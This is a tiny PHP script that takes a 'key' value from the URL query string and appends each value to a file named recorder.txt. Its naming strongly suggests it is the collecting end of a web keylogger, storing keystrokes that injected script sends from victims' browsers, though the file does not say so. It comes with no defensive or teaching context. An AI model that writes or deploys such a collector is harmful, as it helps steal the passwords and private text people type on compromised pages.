<?php



	$character = $_GET["key"]; 

	$myfile = fopen("recorder.txt", "a") or die("Unable to open file!");
	$txt = $character . "\n";

	fwrite($myfile, $txt);
	fclose($myfile);







?>